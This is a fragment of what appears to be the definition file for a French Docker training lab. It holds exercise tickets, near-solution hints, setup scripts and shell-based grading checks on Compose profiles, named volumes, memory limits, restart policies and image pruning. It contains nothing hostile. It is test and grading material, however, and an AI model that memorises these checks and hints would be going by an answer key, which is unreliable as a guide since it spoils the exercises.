             "hints": ["Compose lit tout seul un fichier du dossier du projet, et remplace les variables écrites <code>${…}</code> dans <code>compose.yaml</code>. Vérifiez le résultat avec <code>docker compose config</code>.",
                       "<code>APP_VERSION: ${APP_VERSION}</code> dans l'environnement du service api. Après modification, <code>docker compose up -d</code> recrée les conteneurs concernés."],
             "checks": [
                 ('grep -qE "^APP_VERSION=.?2\\.0.?$" $P/.env', "~/projet/.env doit définir APP_VERSION=2.0."),
                 ('! grep -q "2\\.0" $P/compose.yaml', "La version 2.0 est écrite en dur dans compose.yaml : elle doit venir du fichier .env."),
                 ('cfg $P/compose.yaml \'.services.api.environment.APP_VERSION == "2.0" or .services.api.build.args.APP_VERSION == "2.0"\'', "Dans la configuration appliquée (docker compose config), le service api ne reçoit pas APP_VERSION=2.0."),
                 ('http 8080 /api/health | jq -e ".version == \\"2.0\\""', "L'API ne s'annonce pas en version 2.0 (conteneur recréé, ou image reconstruite ?)."),
             ]},
            {"id": "D10.5", "points": 4, "title": "L'outil d'admin à la demande",
             "ticket": {"from": "lea", "body": "Ajoute à la pile un service <code>outils</code> (image <code>redis:7-alpine</code>) pour lancer ponctuellement <code>redis-cli</code> contre le Redis de la pile. Il ne doit <strong>jamais</strong> démarrer avec un simple <code>docker compose up</code> : on le lance à la demande, et il disparaît après usage."},
             "desc": "Le service <code>outils</code> (redis:7-alpine) est rattaché à un profil ; aucun conteneur <code>outils</code> ne traîne ; lancé à la demande avec son profil, <code>redis-cli -h redis ping</code> répond PONG.",
             "hints": ["Compose sait rattacher un service à un « profil » qui n'est activé que sur demande.",
                       "<code>profiles: [...]</code> sur le service, puis <code>docker compose --profile &lt;nom&gt; run --rm outils redis-cli -h redis ping</code>."],
             "checks": [
                 ("docker compose -f $P/compose.yaml --profile '*' config --format json 2>/dev/null | jq -e '.services.outils.image | startswith(\"redis\")' >/dev/null", "La pile n'a pas de service outils basé sur l'image redis:7-alpine."),
                 ("docker compose -f $P/compose.yaml --profile '*' config --format json | jq -e '(.services.outils.profiles // []) | length > 0' >/dev/null", "Le service outils doit être rattaché à un profil : il ne doit pas démarrer avec docker compose up."),
                 ("! compose $P/compose.yaml ps -a --format '{{.Service}}' | grep -qx outils", "Un conteneur outils existe encore : lancez-le ponctuellement avec run --rm."),
                 ("p=$(docker compose -f $P/compose.yaml --profile '*' config --format json | jq -r '.services.outils.profiles[0]'); r=$(timeout 60 docker compose -f $P/compose.yaml --profile \"$p\" run --rm -T outils redis-cli -h redis ping 2>/dev/null | tr -d '\\r'); [ \"$r\" = PONG ]", "docker compose --profile … run --rm outils redis-cli -h redis ping ne répond pas PONG."),
             ]},
            {"id": "D10.6", "points": 5, "title": "Le stock remis à zéro", "manual": True,
             "ticket": {"from": "diallo", "body": "La pile du stock (<code>~/stock</code>) marche très bien… jusqu'à la maintenance du dimanche : Léa fait <code>docker compose down</code> puis <code>docker compose up -d</code>, et tout le stock est perdu ! Corrige <code>~/stock/compose.yaml</code> (le service doit toujours s'appeler <code>redis</code>)."},
             "desc": "Avec <code>~/stock/compose.yaml</code>, une donnée écrite dans <code>redis</code> survit à <code>docker compose down</code> suivi de <code>docker compose up -d</code>.",
             "hints": ["Faites l'essai : écrivez une clé, <code>down</code>, <code>up -d</code>, et comparez <code>docker volume ls</code> avant et après. Combien de volumes, et lequel est monté ?",
                       "Un volume sans nom (<code>- /data</code>) appartient au conteneur : le prochain <code>up</code> en crée un nouveau, vide. Déclarez un volume <strong>nommé</strong> (section <code>volumes:</code> de premier niveau)."],
             "checks": [
                 ('compose $H/stock/compose.yaml config -q', "~/stock/compose.yaml est absent ou invalide."),
                 ('compose $H/stock/compose.yaml config --services | grep -qx redis', "Le service de ~/stock/compose.yaml doit toujours s'appeler redis."),
                 ('t=v$RANDOM$RANDOM; cd $H/stock || exit 1; pret() { for i in $(seq 1 20); do docker compose exec -T redis redis-cli ping 2>/dev/null | grep -q PONG && return 0; sleep 1; done; return 1; }; docker compose up -d >/dev/null 2>&1 && pret && docker compose exec -T redis redis-cli set lab-verif "$t" >/dev/null && docker compose down >/dev/null 2>&1 && docker compose up -d >/dev/null 2>&1 && pret; r=$(docker compose exec -T redis redis-cli get lab-verif 2>/dev/null | tr -d "\\r"); docker compose exec -T redis redis-cli del lab-verif >/dev/null 2>&1; echo "MSG:valeur relue après down puis up : ${r:-aucune}"; [ "$r" = "$t" ]', "Après docker compose down puis up -d, les données du stock sont perdues."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    11: {
        "title": "Jour 11 — Incident en production",
        "description": "Diagnostiquer, limiter et garder un moteur propre. Compétences : ps, logs, config, port, OOM et limites mémoire, politiques de redémarrage, image prune.",
        "lesson": """<h3>Méthode de diagnostic</h3><ol><li><code>docker compose ps -a</code> : quels services tournent ? Lequel redémarre en boucle (<em>Restarting</em>) ou s'est arrêté, et avec quel code ?</li><li><code>docker compose logs api</code> : le message d'erreur du processus.</li><li><code>docker compose config</code> : la configuration réellement appliquée (variables, ports).</li><li><code>docker port conteneur</code> : quels ports sont publiés, et vers quoi.</li><li><code>docker compose exec api env</code> : les variables vues par l'application.</li></ol><div class="tip">Dans <code>ports:</code>, l'ordre est toujours <strong>hôte:conteneur</strong>. Le port du conteneur est celui sur lequel l'application écoute vraiment.</div><h3>Mort sans un mot : les limites mémoire</h3><p><code>--memory 256m</code> (<code>mem_limit</code> en compose) plafonne la mémoire d'un conteneur ; <code>--memory-swap</code> (même valeur) interdit le swap. Au-delà, le noyau <strong>tue</strong> le processus (SIGKILL) : pas de message d'erreur de l'application, seulement un code de sortie. <code>docker inspect</code> garde la cause dans <code>.State</code>, et <code>docker update</code> modifie la limite d'un conteneur, même arrêté.</p><h3>Après une coupure</h3><p>Au redémarrage du moteur, seuls les conteneurs dont la politique le prévoit repartent (<code>always</code>, et <code>unless-stopped</code> s'ils tournaient). La politique d'un conteneur existant se change avec <code>docker update --restart …</code>, sans le recréer.</p><h3>Faire de la place</h3><pre>docker system df              # espace utilisé par les images, conteneurs, volumes, cache<br>docker image prune            # supprime les images « pendantes » (&lt;none&gt;) inutilisées<br>docker image prune -a         # supprime TOUTES les images non utilisées par un conteneur (attention !)<br>docker container prune        # supprime les conteneurs arrêtés<br>docker builder prune          # vide le cache de construction</pre><p>Une image <em>pendante</em> (<em>dangling</em>) est une ancienne version qui a perdu son tag après un nouveau <code>docker build -t</code>. <code>prune</code> ne supprime jamais une image utilisée par un conteneur, même arrêté.</p>""",
        "setup": r'''
images_de_base
arreter_jour 9
arreter redis api legacy-web legacy-db api-sec redis-sec vitrine-a vitrine-b
# Les ports de la pile incident doivent être libres
for p in 3000 8090; do ids=$(docker ps -q --filter publish=$p); [ -z "$ids" ] || arreter $ids; done
L="--label lab.jour=11"
mkdir -p $H/incident
cp -rn /opt/docker-lab/incident/. $H/incident/
own $H/incident
(cd $H/incident && docker compose up -d --build >/dev/null 2>&1) || true
# D11.2 : trois versions de brouillon-marc ; la première est encore utilisée par un conteneur arrêté
docker rm -f brouillon-test >/dev/null 2>&1 || true
anciennes=""
for v in 1 2 3; do
  printf 'FROM alpine\nRUN echo "brouillon %s (%s)" > /version\n' "$v" "$(hexa 3)" | docker build -q -t brouillon-marc - >/dev/null
  [ $v = 1 ] && docker create --name brouillon-test $L brouillon-marc cat /version >/dev/null
  [ $v = 3 ] || anciennes="$anciennes $(docker image inspect -f '{{.Id}}' brouillon-marc)"
done
emit ANCIENNES "$anciennes"
# D11.3 : un import tué par la limite mémoire
docker rm -f import-compta >/dev/null 2>&1 || true
docker build -q -t import-compta:1.0 /opt/docker-lab/fabrique/import >/dev/null
docker run -d --name import-compta $L --memory 64m --memory-swap 64m import-compta:1.0 >/dev/null
timeout 30 docker wait import-compta >/dev/null 2>&1 || true
# D11.4 : trois services aux politiques de redémarrage inadaptées
docker rm -f badgeuse supervision outil-ponctuel >/dev/null 2>&1 || true
svc='trap "exit 0" TERM; sleep infinity & wait'
docker run -d --name badgeuse $L alpine sh -c "$svc" >/dev/null
docker run -d --name supervision $L alpine sh -c "$svc" >/dev/null
docker run -d --name outil-ponctuel $L --restart always alpine sh -c "$svc" >/dev/null
emit ETATS "$(docker inspect -f '{{.Id}}' badgeuse) $(docker inspect -f '{{.Id}}{{.State.StartedAt}}' supervision outil-ponctuel | tr '\n' ' ')"
''',
        "exercises": [
            {"id": "D11.1", "points": 8, "title": "La pile de Marc",
             "ticket": {"from": "sophie", "body": "Alerte ! La pile <code>~/incident</code> déployée par Marc juste avant son départ ne fonctionne pas : l'API devrait répondre sur <code>http://localhost:8090/visites</code>. Je n'ai pas le temps de t'en dire plus, mais je parie qu'il y a <strong>plusieurs</strong> erreurs."},
             "desc": "Après correction de <code>~/incident</code> (fichiers compose et Dockerfile), <code>http://localhost:8090/visites</code> compte les visites.",
             "hints": ["Commencez par <code>docker compose ps -a</code> et <code>docker compose logs api</code> dans <code>~/incident</code>. Traitez une erreur à la fois : chaque correction fait apparaître la suivante.",
                       "Comparez ce que la pile donne à l'API (fichier lancé, variables, ports) avec ce qu'attend <code>server.js</code> : nom du fichier, nom de la variable lue par <code>process.env</code>, port d'écoute.",
                       "Trois erreurs : la commande de démarrage de l'image, le sens de la redirection de port, et le nom d'une variable d'environnement."],
             "checks": [
                 ('http 8090 /visites | jq -e ".visites >= 1"', "http://localhost:8090/visites ne compte pas les visites."),
                 ('compose $H/incident/compose.yaml ps --status running --services | grep -qx api', "Le service api de la pile incident ne tourne pas."),
             ]},
            {"id": "D11.2", "points": 3, "title": "Le disque se remplit",
             "ticket": {"from": "lea", "body": "Le disque du serveur se remplit : Marc a reconstruit plusieurs fois son image <code>brouillon-marc</code>, et les anciennes versions traînent sans nom (<code>&lt;none&gt;</code>). Supprime <strong>toutes</strong> les anciennes versions ; garde la dernière (celle qui porte le tag). Attention, les images de base (node, nginx, redis…) doivent rester : on n'a pas Internet dans la salle serveur."},
             "desc": "Plus aucune ancienne version de <code>brouillon-marc</code> ; <code>brouillon-marc:latest</code>, <code>node:20-alpine</code>, <code>nginx:alpine</code>, <code>redis:7-alpine</code> et <code>alpine</code> sont toujours présentes.",
             "hints": ["<code>docker images</code> montre les images pendantes. Après un premier ménage, pourquoi l'une d'elles résiste-t-elle ? Qui l'utilise encore ?",
                       "<code>docker ps -a --filter ancestor=&lt;id&gt;</code> ; supprimez le conteneur de test arrêté, puis relancez le ménage des images pendantes (sans <code>-a</code> !)."],
             "checks": [
                 ('for i in node:20-alpine nginx:alpine redis:7-alpine alpine:latest; do docker image inspect $i >/dev/null 2>&1 || exit 1; done', "Des images de base ont été supprimées ! (docker image prune -a supprime toutes les images inutilisées)"),
                 ('docker image inspect brouillon-marc:latest >/dev/null 2>&1', "La dernière version de brouillon-marc (celle qui porte le tag) a été supprimée : il fallait la garder."),
                 ('for i in $LAB_ANCIENNES; do ! docker image inspect "$i" >/dev/null 2>&1 || { echo "MSG:image ${i#sha256:} encore présente" | cut -c1-40; exit 1; }; done', "Il reste d'anciennes versions de brouillon-marc : docker image prune ne supprime pas une image encore utilisée par un conteneur, même arrêté."),
             ]},
            {"id": "D11.3", "points": 5, "title": "L'import meurt sans un mot",
             "ticket": {"from": "diallo", "body": "L'import comptable (<code>import-compta</code>) s'arrête au milieu, et rien dans les logs : juste « chargement du fichier… », puis plus rien. Trouve ce qui le tue, écris la cause dans <code>~/cause.txt</code>, et fais-le aller au bout. La limite mémoire imposée par Sophie reste obligatoire : <strong>128 Mo au plus</strong>."},
             "desc": "<code>~/cause.txt</code> donne la cause de l'arrêt ; le conteneur <code>import-compta</code> (image et commande d'origine) s'est terminé avec le code 0 après « Import terminé », avec une limite mémoire de 128 Mo au plus.",
             "hints": ["Quel est son code de sortie ? Au-delà de 128, c'est un signal : lequel, et qui l'a envoyé ? <code>docker inspect</code> garde la réponse dans <code>.State</code>.",
                       "<code>.State.OOMKilled</code> : la limite mémoire est trop basse. <code>docker update --memory … --memory-swap …</code> (même valeur, 128 Mo au plus) puis <code>docker start</code>, ou recréez le conteneur."],
             "checks": [
                 ('grep -Eqi "oom|mémoire|memoire|memory" $H/cause.txt', "~/cause.txt n'explique pas ce qui a tué l'import."),
                 ('[ "$(insp import-compta "{{.Config.Image}}")" = import-compta:1.0 ] && [ "$(insp import-compta "{{json .Config.Cmd}}")" = "$(docker image inspect -f "{{json .Config.Cmd}}" import-compta:1.0)" ]', "import-compta doit lancer l'image import-compta:1.0 avec sa commande par défaut."),
                 ('[ "$(insp import-compta "{{.State.Status}} {{.State.ExitCode}}")" = "exited 0" ] && docker logs import-compta 2>&1 | grep -q "Import terminé"', "L'import import-compta n'est pas allé au bout (code 0 et « Import terminé »)."),
                 ('m=$(insp import-compta "{{.HostConfig.Memory}}"); [ "$m" -gt 0 ] && [ "$m" -le 134217728 ]', "La limite mémoire de import-compta doit rester en place, à 128 Mo au plus."),
             ]},
            {"id": "D11.4", "points": 4, "title": "Après la coupure de courant", "manual": True,
             "ticket": {"from": "sophie", "body": "Leçon de la coupure de cette nuit : après un redémarrage du serveur, <code>badgeuse</code> et <code>supervision</code> doivent revenir toutes seules (et aussi si elles plantent), sauf si on les a arrêtées volontairement. <code>outil-ponctuel</code>, lui, ne doit <strong>jamais</strong> redémarrer tout seul. Ne les recrée pas et ne les redémarre pas : elles tournent."},
             "desc": "<code>badgeuse</code> et <code>supervision</code> ont la politique de redémarrage adaptée, <code>outil-ponctuel</code> n'en a aucune ; aucun des trois n'a été recréé ni redémarré ; <code>badgeuse</code> revient seule après un plantage.",
             "hints": ["Chaque conteneur a une politique de redémarrage, et elle se modifie à chaud. Laquelle respecte « sauf si on les a arrêtées volontairement » ?",
                       "<code>docker update --restart …</code> ; <code>no</code> pour ne jamais redémarrer."],
             "checks": [
                 ('[ "$(docker inspect -f "{{.Id}}" badgeuse 2>/dev/null) $(docker inspect -f "{{.Id}}{{.State.StartedAt}}" supervision outil-ponctuel 2>/dev/null | tr "\\n" " ")" = "$LAB_ETATS" ]', "badgeuse, supervision ou outil-ponctuel a été recréé, arrêté ou redémarré : les politiques se modifient à chaud (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('[ "$(insp badgeuse "{{.HostConfig.RestartPolicy.Name}}")" = unless-stopped ] && [ "$(insp supervision "{{.HostConfig.RestartPolicy.Name}}")" = unless-stopped ]', "badgeuse et supervision doivent revenir seules après un plantage ou un redémarrage du serveur, sauf si on les a arrêtées volontairement."),
                 ('p=$(insp outil-ponctuel "{{.HostConfig.RestartPolicy.Name}}"); [ "$p" = no ] || [ -z "$p" ]', "outil-ponctuel ne doit jamais redémarrer tout seul."),
                 ('running badgeuse && n=$(insp badgeuse "{{.RestartCount}}") && kill -9 "$(insp badgeuse "{{.State.Pid}}")" && for i in $(seq 1 10); do sleep 1; [ "$(insp badgeuse "{{.RestartCount}}")" -gt "$n" ] && running badgeuse && exit 0; done; exit 1', "Après un plantage (kill -9 de son processus), badgeuse n'est pas revenue seule."),
             ]},
        ],
    },
}
